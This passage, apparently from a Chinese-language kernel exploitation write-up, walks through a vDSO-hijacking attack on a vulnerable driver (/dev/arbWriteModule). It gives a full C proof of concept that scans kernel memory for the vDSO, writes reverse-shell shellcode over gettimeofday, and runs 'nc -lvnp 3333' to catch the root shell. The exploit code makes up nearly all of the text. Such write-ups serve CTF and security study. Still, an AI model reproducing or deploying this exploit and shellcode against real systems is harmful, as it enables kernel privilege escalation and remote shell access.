
```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/time.h>
#include <sys/auxv.h>

struct arbWriteNote
{
    ssize_t addr;
    ssize_t len;
    char *data;
};
struct arbWriteNote arbWriteObj;
int get_gettimeofday_str_offset();

int main(int argc, char *argv[])
{
    int gettimeofday_str_offset = get_gettimeofday_str_offset();
    printf("gettimeofday str in vdso.so offset=0x%x\n",gettimeofday_str_offset);
    size_t vdso_addr = -1;
    for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {
        //读取一页数据
        arbitrary_read(devFD,0x1000,buf,addr);
        //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址
        //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页
        if (!strcmp(buf+gettimeofday_str_offset,"gettimeofday")) {
            printf("[+]find vdso.so!!\n");
            vdso_addr = addr;
            printf("[+]vdso in kernel addr=0x%lx\n",vdso_addr);
            break;
        }
    }
}

//获取vdso里的字符串"gettimeofday"相对vdso.so的偏移
int get_gettimeofday_str_offset() {
    //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx
    size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);
    char *name = "gettimeofday";
    if (!vdso_addr) {
        printf("[-]error get name's offset\n");
    }
    //仅需要搜索1页大小即可，因为vdso映射就一页0x1000
    size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));
    if (name_addr < 0) {
        printf("[-]error get name's offset\n");
    }
    return name_addr - vdso_addr;
}
```

之后得到具体的地址

![image-20211020150723942](https://bbs.kanxue.com/upload/attach/202208/904686_V9DH3CKGH3TYCDJ.jpg)

那么最终的`gettimeofday`相对于`vmlinux`基地址就是

```c
gettimeofday_addr = 0xffffffff81e04b20+0xb20
```

#### (3)任意写劫持`gettimeofday`

最终利用任意写，将`gettimeofday`函数的内容改为我们的`shellcode`即可

#### POC

```c
// gcc -static exp.c -o exp
// ffffffff810a78d0 T SyS_gettimeofday
// ffffffff810a78d0 T sys_gettimeofday
// ffffffff810b08f0 T do_gettimeofday
// ffffffff810c7350 T compat_SyS_gettimeofday
// ffffffff810c7350 T compat_sys_gettimeofday
// 0x13d
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/time.h>
#include <sys/auxv.h>

#define GETTIMEOFDAY_FUN 0xB20

struct arbWriteNote
{
    ssize_t addr;
    ssize_t len;
    char *data;
};
struct arbWriteNote arbWriteObj;

//用于反弹shell的shellcode，127.0.0.1:3333
//或者在比赛中可以直接写类似Orw打开flag的shellcode
char shellcode[]="\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";

//open dev
int openDev(char *pos);
int get_gettimeofday_str_offset();

int main(int argc, char *argv[])
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);

    int devFD;
    int addrFD;
    unsigned long memOffset;
    pthread_t thread;

    //open Dev
    char *pos = "/dev/arbWriteModule";
    devFD = openDev(pos);
    
    char *buf = (char *)calloc(1,0x1000);
    
    int gettimeofday_str_offset = get_gettimeofday_str_offset();
    printf("gettimeofday str in vdso.so offset=0x%x\n",gettimeofday_str_offset);
    size_t vdso_addr = -1;
    for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {
        //读取一页数据
        arbitrary_read(devFD,0x1000,buf,addr);
        //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址
        //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页
        if (!strcmp(buf+gettimeofday_str_offset,"gettimeofday")) {
            printf("[+]find vdso.so!!\n");
            vdso_addr = addr;
            printf("[+]vdso in kernel addr=0x%lx\n",vdso_addr);
            break;
        }
    }
    if (vdso_addr == -1) {
        printf("[-]can't find vdso.so!!\n");
    }
    size_t gettimeofday_addr = vdso_addr + GETTIMEOFDAY_FUN;
    printf("[+]gettimeofday function in kernel addr=0x%lx\n",gettimeofday_addr);
    //将gettimeofday处写入我们的shellcode，因为写操作在内核驱动里完成，内核可以读写执行vdso
    //用户只能读和执行vdso
    arbitrary_write(devFD,strlen(shellcode),shellcode,gettimeofday_addr);
    sleep(1);
    printf("[+]open a shell\n");
    system("nc -lvnp 3333");
    return 0;
}

int openDev(char *pos){
    int devFD;
    printf("[+] Open %s...\n",pos);
    if ((devFD = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return devFD;
}

//获取vdso里的字符串"gettimeofday"相对vdso.so的偏移
int get_gettimeofday_str_offset() {
    //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx
    size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);
    char *name = "gettimeofday";
    if (!vdso_addr) {
        printf("[-]error get name's offset\n");
    }
    //仅需要搜索1页大小即可，因为vdso映射就一页0x1000
    size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));
    if (name_addr < 0) {
        printf("[-]error get name's offset\n");
    }
    return name_addr - vdso_addr;
}

void arbitrary_read(int devFD,int len,char *buf,size_t addr)
{
    arbWriteObj.len = len;
    arbWriteObj.data = buf;
    arbWriteObj.addr = addr;
    ioctl(devFD,111,&arbWriteObj);
}

void arbitrary_write(int devFD,int len,char *buf,size_t addr)
{
    arbWriteObj.len = len;
    arbWriteObj.data = buf;
    arbWriteObj.addr = addr;
    ioctl(devFD,222,&arbWriteObj);
}
```

参考：
